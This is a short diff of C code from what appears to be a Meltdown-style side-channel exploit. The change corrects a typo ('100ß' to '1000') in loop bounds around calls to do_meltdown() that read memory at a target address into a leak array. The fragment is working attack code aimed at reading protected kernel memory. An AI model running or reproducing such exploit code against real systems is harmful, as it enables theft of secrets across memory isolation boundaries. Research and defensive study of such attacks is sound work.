@@ -172,10 +172,10 @@ static void attack_init_uts_ns(){
     wait(1E9);
     cc_init();
     int leaked_val[1000];
-    for (int i=0;i<100ß;i++) leaked_val[i] = -1;
+    for (int i=0;i<1000;i++) leaked_val[i] = -1;
     
     for(int j=0;j<10000;j++){
-        for (int i=0;i<100ß;i++){
+        for (int i=0;i<1000;i++){
             if (leaked_val[i] == -1){
                 my_mfence();
                 leaked_val[i]=do_meltdown(target_adrs+i);
